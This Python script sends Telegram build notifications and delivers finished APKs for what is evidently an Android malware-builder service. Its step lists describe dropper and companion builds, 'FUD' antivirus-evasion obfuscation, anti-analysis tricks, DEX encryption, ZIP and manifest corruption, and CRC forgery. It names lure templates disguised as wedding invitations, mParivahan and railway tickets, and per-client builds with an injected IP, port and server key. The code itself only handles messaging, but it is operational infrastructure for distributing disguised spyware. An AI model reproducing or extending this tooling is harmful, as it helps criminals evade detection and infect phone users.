#!/usr/bin/env python3
"""
telegram_notify.py
─────────────────────────────────────────────────────────────────────────────
Called by build_dev.yml / build.yml at every step.
Edits a single Telegram message in-place (message mutation).
On success: edits message to success state + sends APK file.
On failure: edits message to failed state.

Usage:
  python3 scripts/telegram_notify.py \
    --step       "Build companion APK" \
    --status     "progress" \
    --build      "271" \
    --template   "wedding" \
    --client     "1" \
    --chat-id    "8852912150" \
    --msg-id     "12345" \
    --token      "BOT_TOKEN" \
    --build-type "full"        # full | companion_only (default: full)
    --pkg        "com.example" # shown from step 4 onwards

  # Final success step with APK:
  python3 scripts/telegram_notify.py \
    --step       "Send to Telegram" \
    --status     "success" \
    --build      "271" \
    --template   "wedding" \
    --client     "1" \
    --chat-id    "8852912150" \
    --msg-id     "12345" \
    --token      "BOT_TOKEN" \
    --build-type "full" \
    --apk        "app/build/outputs/apk/release/nova_abc123.apk" \
    --apk-size   "2.7 MB" \
    --pkg        "com.shaadicard.invitemaker"
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone

# ── Full build steps (dropper + companion) ────────────────────────────────────
BUILD_STEPS_FULL = [
    ("Checkout",              "[1/9] 📥 Checkout & setup"),
    ("Install tools",         "[2/9] 🔧 Install build tools"),
    ("Generate package name", "[3/9] 🎲 Generate package name"),
    ("Inject Nova package",   "[4/9] 💉 Inject Nova package"),
    ("Build companion APK",   "[5/9] 🔨 Build companion APK"),
    ("Build release APK",     "[6/9] 🏗  Build Nova release APK"),
    ("Phase 2 obfuscation",   "[7/9] 🛡  Phase 2 — FUD obfuscation"),
    ("Re-sign APK",           "[7/9] ✍️  Re-sign APK"),
    ("Strip fingerprints",    "[8/9] 🧹 Strip fingerprints + anti-analysis"),
    ("Integrity check",       "[9/9] 🔍 Integrity check"),
    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
]

# ── Companion-only build steps — 8 phases (matches real execution order) ──────
# Real execution order in build_module.py main():
#   Phase 4: PHASE_1 steps 1–6   → decompile + patch smali
#   Phase 5: PHASE_6 + PHASE_1 steps 7/10/9A → obfuscate + assemble
#   Phase 6: PHASE_2 + SIGNING   → anti-analysis + re-sign
#   Phase 7: PHASE_3 + POST_RESIGN → encrypt DEX + sign + harden
BUILD_STEPS_COMPANION = [
    ("Checkout",                "[1/8] 📥 Checkout & setup"),
    ("Install tools",           "[2/8] 🔧 Install build tools"),
    ("Generate package name",   "[3/8] 🎲 Generate package name"),
    ("Decompile & patch smali", "[4/8] 🔨 Decompile & patch smali"),
    ("Obfuscate & assemble APK","[5/8] 🔀 Obfuscate & assemble APK"),
    ("Encrypt DEX & resources", "[6/8] 🔐 Encrypt DEX & resources"),
    ("Sign & harden APK",       "[7/8] ✍️  Sign & harden APK"),
    ("Send to Telegram",        "[8/8] 📤 Send APK to Telegram"),
]

# ── Average step durations in seconds (for ETA) ──────────────────────────────
STEP_DURATIONS_FULL = {
    "Checkout":              15,
    "Install tools":         60,
    "Generate package name": 10,
    "Inject Nova package":   10,
    "Build companion APK":   90,
    "Build release APK":    180,
    "Phase 2 obfuscation":   30,
    "Re-sign APK":           15,
    "Strip fingerprints":    20,
    "Integrity check":       10,
    "Send to Telegram":      10,
}

STEP_DURATIONS_COMPANION = {
    "Checkout":                 15,
    "Install tools":            60,
    "Generate package name":    10,
    "Decompile & patch smali": 60,
    "Obfuscate & assemble APK": 90,
    "Encrypt DEX & resources":  75,
    "Sign & harden APK":        45,
    "Send to Telegram":         10,
}

# ── Sub-step labels shown under the active phase (↳ line) ────────────────────
# Maps PHASE/STEP_ID → (phase_key, sub_step_label)
# phase_key must match a key in BUILD_STEPS_COMPANION
COMPANION_SUB_STEPS = {
    # Phase 4: Decompile & patch smali
    "PHASE_1/STEP_1":    ("Decompile & patch smali", "Generate package name"),
    "PHASE_1/STEP_1B":   ("Decompile & patch smali", "Update StringPool"),
    "PHASE_1/STEP_2":    ("Decompile & patch smali", "Verify companion APK"),
    "PHASE_1/STEP_3":    ("Decompile & patch smali", "Extract APK metadata"),
    "PHASE_1/STEP_4":    ("Decompile & patch smali", "Randomize resource filenames"),
    "PHASE_1/STEP_5":    ("Decompile & patch smali", "Decompile APK → smali"),
    "PHASE_1/STEP_5B":   ("Decompile & patch smali", "Patch server config"),
    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch dropper uninstall target"),
    "PHASE_1/STEP_5D":   ("Decompile & patch smali", "Patch onResume loop fix"),
    "PHASE_1/STEP_6":    ("Decompile & patch smali", "Rename smali class paths"),
    # Phase 5: Obfuscate & assemble APK
    "PHASE_6/STEP_6A":   ("Obfuscate & assemble APK", "Rename classes → Android names"),
    "PHASE_6/STEP_6B":   ("Obfuscate & assemble APK", "Inject crash reporter"),
    "PHASE_1/STEP_7":    ("Obfuscate & assemble APK", "Patch home launcher check"),
    "PHASE_6/STEP_6C":   ("Obfuscate & assemble APK", "Replace bad string literals"),
    "PHASE_6/STEP_6D":   ("Obfuscate & assemble APK", "Rename custom methods"),
    "PHASE_6/STEP_6E":   ("Obfuscate & assemble APK", "Rename socket package"),
    "PHASE_1/STEP_10":   ("Obfuscate & assemble APK", "Patch manifest + assemble APK"),
    "PHASE_1/STEP_9A":   ("Obfuscate & assemble APK", "Patch versionCode + versionName"),
    "PHASE_1/STEP_12_FINGERPRINT": ("Obfuscate & assemble APK", "Generate per-build fingerprint"),
    "PHASE_1/STEP_13_SIGN":        ("Obfuscate & assemble APK", "Sign companion APK"),
    "PHASE_1/STEP_14_ASSET":       ("Obfuscate & assemble APK", "Replace companion.apk in assets"),
    "PHASE_1/STEP_15_KOTLIN":      ("Obfuscate & assemble APK", "Inject package name into Kotlin"),
    # Phase 6: Encrypt DEX & resources
    "PHASE_2/STEP_17H":            ("Encrypt DEX & resources", "Inject fake string resources"),
    "PHASE_2/STEP_17_MANIFEST":    ("Encrypt DEX & resources", "Inject fake manifest entries"),
    "PHASE_2/STEP_11_ZIPALIGN":    ("Encrypt DEX & resources", "Zipalign APK"),
    "PHASE_2/STEP_AXML_0200":      ("Encrypt DEX & resources", "Inject unknown AXML chunk"),
    "PHASE_2/STEP_REPAIR_RESMAP":  ("Encrypt DEX & resources", "Validate + repair resource map"),
    "PHASE_2/STEP_AXML_PATCHER":   ("Encrypt DEX & resources", "AXML manifest bomb"),
    "PHASE_2/STEP_ZIP_ENHANCER":   ("Encrypt DEX & resources", "Ghost ZIP entries injection"),
    "PHASE_2/STEP_FAKE_META_INF":  ("Encrypt DEX & resources", "Inject fake META-INF entries"),
    "SIGNING/STEP_RESIGN_1":       ("Encrypt DEX & resources", "Re-sign after anti-analysis"),
    "PHASE_1/STEP_14_ASSET_2":     ("Encrypt DEX & resources", "Replace companion.apk after re-sign"),
    "PHASE_3/STEP_DEX_REBUILD_FULL":("Encrypt DEX & resources", "Rebuild full DEX"),
    "PHASE_3/STEP_DEX_ENCRYPT":    ("Encrypt DEX & resources", "Encrypt DEX → AES-256-CBC"),
    "PHASE_3/STEP_STUB_SMALI":     ("Encrypt DEX & resources", "Write stub smali classes"),
    "PHASE_3/STEP_SMALI_PRUNE":    ("Encrypt DEX & resources", "Prune smali → stub only"),
    "PHASE_3/STEP_APKTOOL_YML":    ("Encrypt DEX & resources", "Write fresh apktool.yml"),
    "PHASE_3/STEP_DEX_REBUILD":    ("Encrypt DEX & resources", "Rebuild stub DEX"),
    "PHASE_3/STEP_DEX_INJECT":     ("Encrypt DEX & resources", "Inject stub DEX into APK"),
    "PHASE_3/STEP_RES_ENCRYPT":    ("Encrypt DEX & resources", "Encrypt resources → AES-256-CBC"),
    "PHASE_3/STEP_STUB_ARSC":      ("Encrypt DEX & resources", "Replace ARSC with stub"),
    # Phase 7: Sign & harden APK
    "SIGNING/STEP_RESIGN_PHASE3":        ("Sign & harden APK", "Re-sign after DEX encryption"),
    "PHASE_1/STEP_14_ASSET_PHASE3":      ("Sign & harden APK", "Replace companion.apk final"),
    "POST_RESIGN/STEP_TIMESTAMP_RAND":   ("Sign & harden APK", "Randomize ZIP timestamps"),
    "POST_RESIGN/STEP_BADPACK_GP":       ("Sign & harden APK", "BadPack LFH mismatch injection"),
    "POST_RESIGN/STEP_17C":              ("Sign & harden APK", "APK size randomization"),
    "POST_RESIGN/STEP_TYPE2032":         ("Sign & harden APK", "Non-standard compression injection"),
    "POST_RESIGN/STEP_CRC32_FORGE":      ("Sign & harden APK", "CRC-32 forgery — final step"),
}

# ── Template display names + emoji ───────────────────────────────────────────
TEMPLATE_MAP = {
    "wedding":      ("💍", "Wedding Invitation"),
    "shaadi":       ("💒", "Shaadi Ka Nimantran"),
    "shaadi_hindi": ("💒", "Shaadi Ka Nimantran"),
    "mparivahan":   ("🚗", "mParivahan"),
    "railway":      ("🚂", "Indian Railway Ticket"),
    "friends":      ("👥", "Friends Club"),
    "bhabhi":       ("😄", "Fun with Bhabhi"),
    "custom":       ("⚙️",  "Custom"),
    "companion":    ("🔧", "Companion App"),
}


def _get_step_tables(build_type: str):
    """Return (steps_list, durations_dict) for the given build_type."""
    if build_type == "companion_only":
        return BUILD_STEPS_COMPANION, STEP_DURATIONS_COMPANION
    return BUILD_STEPS_FULL, STEP_DURATIONS_FULL


def _progress_bar(pct: int, width: int = 10) -> str:
    """Return a filled progress bar string. e.g. ████████░░ 80%"""
    filled = round(width * pct / 100)
    empty  = width - filled
    bar    = "█" * filled + "░" * empty
    return f"{bar} {pct}%"


def _calc_percent(current_step_key: str, build_type: str) -> int:
    """Return 0-100 percent based on which step is currently running."""
    steps, _ = _get_step_tables(build_type)
    keys = [k for k, _ in steps]
    if current_step_key not in keys:
        return 0
    idx = keys.index(current_step_key)
    # Step i/total: when step i is running, pct = i/total*100
    return round(idx / len(keys) * 100)


def _calc_eta(current_step_key: str, elapsed: int, build_type: str) -> str:
    """Calculate remaining ETA based on current step and elapsed time."""
    steps, durations = _get_step_tables(build_type)
    keys = [k for k, _ in steps]
    found = False
    remaining = 0
    for key in keys:
        if key == current_step_key:
            found = True
            # Current step: add its remaining portion (assume half done)
            remaining += max(0, durations.get(key, 10) // 2)
            continue
        if found:
            remaining += durations.get(key, 10)
    if remaining <= 0:
        return "~0s"
    return f"~{format_elapsed(remaining)}"


def telegram_request(token: str, method: str, data: dict,
                     files: dict = None, retries: int = 3) -> dict:
    """Make Telegram API request with retry."""
    url = f"https://api.telegram.org/bot{token}/{method}"

    for attempt in range(retries):
        try:
            if files:
                import mimetypes
                boundary = "----TelegramBoundary"
                body_parts = []

                for key, value in data.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                        f"{value}\r\n"
                    )

                for key, (filename, file_data, mime) in files.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"; '
                        f'filename="{filename}"\r\n'
                        f"Content-Type: {mime}\r\n\r\n"
                    )

                body = "".join(body_parts).encode("utf-8")
                for key, (filename, file_data, mime) in files.items():
                    body += file_data + f"\r\n--{boundary}--\r\n".encode()

                req = urllib.request.Request(
                    url, data=body,
                    headers={"Content-Type":
                             f"multipart/form-data; boundary={boundary}"}
                )
            else:
                payload = json.dumps(data).encode("utf-8")
                req = urllib.request.Request(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}
                )

            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode("utf-8"))

        except Exception as e:
            print(f"[telegram_notify] Attempt {attempt + 1}/{retries} failed: {e}",
                  file=sys.stderr)
            if attempt < retries - 1:
                time.sleep(3)

    print(f"[telegram_notify] All {retries} attempts failed for {method}",
          file=sys.stderr)
    return {}


def send_message(token: str, chat_id: str, text: str) -> str:
    """Send new message. Returns message_id as string."""
    result = telegram_request(token, "sendMessage", {
        "chat_id":    chat_id,
        "text":       text,
        "parse_mode": "HTML",
    })
    msg = result.get("result", {})
    return str(msg.get("message_id", ""))


def edit_message(token: str, chat_id: str, message_id: str, text: str):
    """Edit existing message in-place (message mutation)."""
    if not message_id or message_id == "0":
        return
    telegram_request(token, "editMessageText", {
        "chat_id":    chat_id,
        "message_id": message_id,
        "text":       text,
        "parse_mode": "HTML",
    })


def send_document(token: str, chat_id: str, apk_path: str,
                  caption: str, filename: str = "",
                  reply_markup: dict = None) -> bool:
    """Send APK file as Telegram document with optional custom filename and inline keyboard."""
    if not os.path.exists(apk_path):
        print(f"[telegram_notify] APK not found: {apk_path}", file=sys.stderr)
        return False

    send_filename = filename if filename else os.path.basename(apk_path)
    with open(apk_path, "rb") as f:
        file_data = f.read()

    payload = {
        "chat_id":    chat_id,
        "caption":    caption,
        "parse_mode": "HTML",
    }
    if reply_markup:
        import json as _json
        payload["reply_markup"] = _json.dumps(reply_markup)

    result = telegram_request(
        token, "sendDocument",
        payload,
        files={
            "document": (send_filename, file_data,
                         "application/vnd.android.package-archive")
        }
    )
    return bool(result.get("ok"))


def format_elapsed(seconds: int) -> str:
    """Format seconds as Xm Ys."""
    m = seconds // 60
    s = seconds % 60
    if m > 0:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def build_progress_message(current_step: str, status: str,
                           build_num: str, template: str,
                           client: str, elapsed: int,
                           pkg: str = "",
                           apk_size: str = "",
                           build_type: str = "full") -> str:
    """Build the progress message text."""

    is_companion = (build_type == "companion_only")
    emoji, display_name = TEMPLATE_MAP.get(
        "companion" if is_companion else template,
        ("⚙️", template.title())
    )
    now_utc = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")

    # ── Normalise step key: strip [DEV] prefix and emoji suffixes ─────────────
    step_key = current_step
    for prefix in ("[DEV] Checkout dev branch", "[DEV] Checkout"):
        if step_key.startswith(prefix):
            step_key = "Checkout"
            break
    for send_suffix in ("Send to Telegram", "Send to Telegram"):
        if send_suffix in step_key:
            step_key = "Send to Telegram"
            break

    steps, durations = _get_step_tables(build_type)
    step_keys  = [k for k, _ in steps]
    step_labels = {k: lbl for k, lbl in steps}

    # ── SUCCESS ───────────────────────────────────────────────────────────────
    if status == "success":
        bar = _progress_bar(100)
        lines = [
            f"✅ <b>Build #{build_num} — SUCCESS</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📦 Type     : {emoji} {display_name}",
            f"👤 Client   : {client}",
            f"🔢 Build    : #{build_num}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📊 Progress : {bar}",
            "━━━━━━━━━━━━━━━━━━━━",
        ]
        if pkg:
            lines.append(f"📦 Package  : <code>{pkg}</code>")
        if apk_size:
            lines.append(f"📁 Size     : {apk_size}")
        lines += [
            f"⏱ Duration : {format_elapsed(elapsed)}",
            f"🕐 Time     : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "APK file sent below ⬇️",
        ]
        return "\n".join(lines)

    # ── FAILURE ───────────────────────────────────────────────────────────────
    if status == "failure":
        pct = _calc_percent(step_key, build_type)
        bar = _progress_bar(pct)
        lines = [
            f"❌ <b>Build #{build_num} — FAILED</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📦 Type     : {emoji} {display_name}",
            f"👤 Client   : {client}",
            f"🔢 Build    : #{build_num}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📊 Progress : {bar}",
            f"⚠️ Failed at: <b>{step_labels.get(step_key, step_key)}</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"⏱ Elapsed   : {format_elapsed(elapsed)}",
            f"🕐 Time      : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "Check GitHub Actions for full log.",
        ]
        return "\n".join(lines)

    # ── PROGRESS ──────────────────────────────────────────────────────────────
    pct = _calc_percent(step_key, build_type)
    bar = _progress_bar(pct)
    eta = _calc_eta(step_key, elapsed, build_type)

    # Render step list
    current_found = False
    step_lines = []
    for key, label in steps:
        if key == step_key:
            step_lines.append(f"⏳ <b>{label}…</b>")
            current_found = True
        elif not current_found:
            step_lines.append(f"✅ {label}")
        else:
            step_lines.append(f"⬜ {label}")

    lines = [
        f"🔨 <b>Building: {emoji} {display_name}</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"👤 Client  : {client}",
        f"🔢 Build   : #{build_num}",
    ]
    if pkg:
        lines.append(f"📦 Package : <code>{pkg}</code>")
    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
    ]
    lines += step_lines
    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
        f"📊 {bar}",
        f"⏱ Elapsed : {format_elapsed(elapsed)}",
        f"⏰ ETA     : {eta}",
        f"🕐 Time    : {now_utc}",
    ]
    return "\n".join(lines)


def resolve_token(token_arg: str) -> str:
    PLACEHOLDER = "YOUR_BOT_TOKEN_HERE"
    if token_arg and token_arg != PLACEHOLDER and ":" in token_arg:
        return token_arg
    env_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    if env_token and env_token != PLACEHOLDER and ":" in env_token:
        return env_token
    env_token2 = os.environ.get("BOT_TOKEN", "")
    if env_token2 and env_token2 != PLACEHOLDER and ":" in env_token2:
        return env_token2
    return ""


def resolve_chat_id(chat_id_arg: str) -> str:
    if chat_id_arg and chat_id_arg not in ("0", "", "YOUR_CHAT_ID_HERE"):
        return chat_id_arg
    env_chat = os.environ.get("TELEGRAM_CHAT_ID", "")
    if env_chat and env_chat not in ("0", ""):
        return env_chat
    env_chat2 = os.environ.get("BUILD_CHAT_ID", "")
    if env_chat2 and env_chat2 not in ("0", ""):
        return env_chat2
    return ""


def build_sub_step_message(phase_key: str, sub_label: str,
                           build_num: str, pkg: str, elapsed: int) -> str:
    """Build full 8-phase companion progress message with ↳ sub-step detail.

    Called from build_module.py via --sub-step mode.
    Shows all 8 phases with ✅/⏳/⬜ and a ↳ line under the active phase.
    """
    steps    = BUILD_STEPS_COMPANION
    step_keys = [k for k, _ in steps]
    now = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")

    # Calculate percent based on active phase index
    active_idx = step_keys.index(phase_key) if phase_key in step_keys else 0
    pct = round(active_idx / len(step_keys) * 100)
    bar = _progress_bar(pct)

    # ETA from durations
    remaining = 0
    found = False
    for key, _ in steps:
        if key == phase_key:
            found = True
            remaining += max(0, STEP_DURATIONS_COMPANION.get(key, 10) // 2)
            continue
        if found:
            remaining += STEP_DURATIONS_COMPANION.get(key, 10)
    eta = f"~{format_elapsed(remaining)}" if remaining > 0 else "~0s"

    lines = [
        "🔨 <b>Building: 🔧 Companion App</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"🔢 Build   : #{build_num}",
    ]
    if pkg:
        lines.append(f"📦 Package : <code>{pkg}</code>")
    lines.append("━━━━━━━━━━━━━━━━━━━━")

    current_found = False
    for key, label in steps:
        if key == phase_key:
            lines.append(f"⏳ <b>{label}…</b>")
            if sub_label:
                lines.append(f"   ↳ {sub_label}")
            current_found = True
        elif not current_found:
            lines.append(f"✅ {label}")
        else:
            lines.append(f"⬜ {label}")

    lines += [
        "━━━━━━━━━━━━━━━━━━━━",
        f"📊 {bar}",
        f"⏱ Elapsed : {format_elapsed(elapsed)}",
        f"⏰ ETA     : {eta}",
        f"🕐 Time    : {now}",
    ]
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--step",        required=True)
    parser.add_argument("--status",      required=True,
                        choices=["progress", "success", "failure"])
    parser.add_argument("--build",       required=True)
    parser.add_argument("--template",    required=True)
    parser.add_argument("--client",      required=True)
    parser.add_argument("--chat-id",     required=True, dest="chat_id")
    parser.add_argument("--msg-id",      required=True, dest="msg_id")
    parser.add_argument("--token",       required=True)
    parser.add_argument("--apk",         default="")
    parser.add_argument("--apk-size",    default="", dest="apk_size")
    parser.add_argument("--pkg",         default="")
    parser.add_argument("--elapsed",     default="0", type=int)
    parser.add_argument("--build-type",  default="full", dest="build_type",
                        choices=["full", "companion_only"])
    parser.add_argument("--commit",      default="", dest="commit")
    parser.add_argument("--client-name", default="", dest="client_name")
    parser.add_argument("--client-ip",    default="", dest="client_ip")
    parser.add_argument("--client-port",  default="", dest="client_port")
    parser.add_argument("--server-key",   default="", dest="server_key")
    parser.add_argument("--app-name",     default="", dest="app_name")
    parser.add_argument("--fud-status",   default="", dest="fud_status")
    # ── sub-step mode: called from build_module.py for per-phase updates ──────
    # Usage:
    #   python3 telegram_notify.py \
    #       --sub-step       "Decompile APK → smali"   # human-readable sub label
    #       --sub-step-phase "Decompile & patch smali"  # must match BUILD_STEPS_COMPANION key
    # All other args (token, chat-id, msg-id, build) read from env vars.
    parser.add_argument("--sub-step",         default="", dest="sub_step")
    parser.add_argument("--sub-step-phase",   default="", dest="sub_step_phase")
    args = parser.parse_args()

    # ── sub-step mode ─────────────────────────────────────────────────────────
    if args.sub_step:
        _token   = resolve_token(getattr(args, "token", "") or "")
        _chat_id = resolve_chat_id(getattr(args, "chat_id", "") or "")
        _msg_id  = (getattr(args, "msg_id", "") or
                    os.environ.get("BUILD_MESSAGE_ID", "") or "0")
        _build   = (getattr(args, "build", "") or
                    os.environ.get("GITHUB_RUN_NUMBER", "0"))
        _pkg     = getattr(args, "pkg", "") or ""

        if not _token or not _chat_id or _msg_id in ("0", ""):
            print("[telegram_notify] sub-step: missing credentials — skipping",
                  file=sys.stderr)
            sys.exit(0)

        _start_ts = os.environ.get("BUILD_START_TS", "")
        _elapsed  = 0
        if _start_ts:
            try:
                _elapsed = int(time.time()) - int(_start_ts)
            except Exception:
                pass

        _phase_key = args.sub_step_phase or "Decompile & patch smali"

        _text = build_sub_step_message(
            phase_key=_phase_key,
            sub_label=args.sub_step,
            build_num=_build,
            pkg=_pkg,
            elapsed=_elapsed,
        )
        edit_message(_token, _chat_id, _msg_id, _text)
        print(f"[telegram_notify] sub-step: [{_phase_key}] ↳ {args.sub_step}")
        sys.exit(0)

    resolved_token   = resolve_token(args.token)
    resolved_chat_id = resolve_chat_id(args.chat_id)

    if not resolved_token or not resolved_chat_id:
        print("[telegram_notify] No chat_id or token — skipping notification")
        sys.exit(0)

    args.token   = resolved_token
    args.chat_id = resolved_chat_id

    # ── Elapsed: use BUILD_START_TS env var if set (more accurate) ────────────
    elapsed = args.elapsed
    start_ts = os.environ.get("BUILD_START_TS", "")
    if start_ts:
        try:
            elapsed = int(time.time()) - int(start_ts)
        except Exception:
            pass

    # ── Also accept BUILD_TYPE env var as fallback ────────────────────────────
    build_type = args.build_type
    if build_type == "full":
        env_bt = os.environ.get("BUILD_TYPE", "")
        if env_bt in ("full", "companion_only"):
            build_type = env_bt

    text = build_progress_message(
        current_step=args.step,
        status=args.status,
        build_num=args.build,
        template=args.template,
        client=args.client,
        elapsed=elapsed,
        pkg=args.pkg,
        apk_size=args.apk_size,
        build_type=build_type,
    )

    if args.msg_id and args.msg_id != "0":
        edit_message(args.token, args.chat_id, args.msg_id, text)
    else:
        print(f"[telegram_notify] No msg_id — message not edited")

    # On success: send APK file as separate message
    if args.status == "success" and args.apk:
        is_companion = (build_type == "companion_only")
        is_dev       = (args.client == "0")
        commit_short = args.commit[:7] if args.commit else ""
        emoji, display_name = TEMPLATE_MAP.get(
            "companion" if is_companion else args.template,
            ("⚙️", args.template.title())
        )

        # ── Build APK filename ────────────────────────────────────────────────
        if is_dev and is_companion:
            # Dev test — companion only
            apk_filename = f"[DEV] Companion #{args.build}"
            if commit_short:
                apk_filename += f" {commit_short}"
            apk_filename += ".apk"
        elif is_dev:
            # Dev test — full build (Wedding Invitation etc.)
            apk_filename = f"[DEV] {display_name} #{args.build}"
            if commit_short:
                apk_filename += f" {commit_short}"
            apk_filename += ".apk"
        else:
            # Production — client build
            parts = []
            if args.client_name:
                parts.append(args.client_name)
            if args.client_ip:
                parts.append(args.client_ip)
            parts.append(display_name)
            parts.append(f"#{args.build}")
            apk_filename = " ".join(parts) + ".apk"

        # ── Build caption ─────────────────────────────────────────────────────
        import datetime as _dt
        built_at = _dt.datetime.utcnow().strftime("%d %b %Y, %-I:%M %p") + " UTC"

        if is_dev:
            caption = (
                f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
                f"Package  : <code>{args.pkg}</code>\n"
                f"Size     : {args.apk_size}"
            )
            if commit_short:
                caption += f"\nCommit   : <code>{commit_short}</code>"
            caption += f"\nBuilt    : {built_at}"
        else:
            # Resolve app name: custom > arg > template display name
            _app_name     = args.app_name or display_name
            # Resolve template label (companion special case handled via display_name already)
            _template_lbl = display_name
            # FUD label
            _fud = args.fud_status.upper()
            if _fud in ("1", "ON", "TRUE", "YES"):
                _fud_lbl = "ON 🟢"
            elif _fud in ("0", "OFF", "FALSE", "NO"):
                _fud_lbl = "OFF 🔴"
            else:
                _fud_lbl = "—"
            _key_lbl = args.server_key or "—"
            caption = (
                f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
                f"Client   : {args.client_name or args.client}\n"
                f"App      : {_app_name}\n"
                f"Template : {_template_lbl}\n"
                f"FUD      : {_fud_lbl}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 Companion injected:\n"
                f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
                f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
                f"Key      : <code>{_key_lbl}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Package  : <code>{args.pkg}</code>\n"
                f"Size     : {args.apk_size}"
            )
            if commit_short:
                caption += f"\nCommit   : <code>{commit_short}</code>"
            caption += f"\nBuilt    : {built_at}"

        # ── Inline keyboard: Rebuild + Cancel directly on the APK message ───────
        # Buttons appear attached to the APK file in chat — no navigation needed.
        # quick_rebuild_<client_id>_<template>  → bot shows rebuild confirm screen
        # quick_cancel_build_<client_id>        → bot cancels current in-progress build
        # Dev builds (client == "0") get no Rebuild button — no client profile to rebuild for.
        rebuild_markup = None
        if not is_dev:
            client_id_str = args.client  # numeric client_id string
            template_str  = args.template
            rebuild_markup = {
                "inline_keyboard": [
                    [
                        {
                            "text":          "🔁 Rebuild",
                            "callback_data": f"quick_rebuild_{client_id_str}_{template_str}"
                        },
                        {
                            "text":          "👤 Client",
                            "callback_data": f"client_{client_id_str}"
                        }
                    ],
                    [
                        {
                            "text":          "🏠 Home",
                            "callback_data": "nav_home"
                        }
                    ]
                ]
            }

        ok = send_document(args.token, args.chat_id, args.apk, caption,
                           filename=apk_filename, reply_markup=rebuild_markup)
        if ok:
            print(f"[telegram_notify] APK sent as '{apk_filename}'")
        else:
            print(f"[telegram_notify] APK send failed", file=sys.stderr)
            sys.exit(1)

    print(f"[telegram_notify] Done — step={args.step} status={args.status} "
          f"build_type={build_type}")


if __name__ == "__main__":
    main()
